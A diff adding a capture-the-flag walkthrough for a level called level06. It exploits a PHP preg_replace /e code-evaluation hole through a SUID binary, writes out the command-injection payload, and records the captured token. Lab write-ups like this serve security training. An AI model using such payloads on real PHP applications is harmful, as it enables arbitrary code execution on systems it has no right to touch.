@@ -1,0 +1,26 @@
+1. List files in the directory:
+   ll
+   # Output shows: level06 binary with SUID permissions and level06.php script
+
+2. Test the binary without arguments:
+   ./level06
+   # Output: PHP Warning about empty filename
+
+3. Examine the PHP script:
+   cat level06.php
+   # Shows PHP code with vulnerable preg_replace using /e modifier
+   # The /e modifier evaluates replacement as PHP code
+
+4. Create exploit file:
+   echo '[x ${`getflag`}]' > /tmp/level06
+   chmod +x /tmp/level06
+
+5. Execute the binary with exploit file:
+   ./level06 /tmp/level06
+   # The vulnerable regex executes the command substitution
+   # Output: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+
+TECHNIQUE: PHP preg_replace /e modifier code execution
+VULNERABILITY: preg_replace with /e evaluates replacement as PHP code
+PAYLOAD: [x ${`getflag`}] - Command substitution within regex replacement
+TOKEN: wiok45aaoguiboiki2tuin6ub
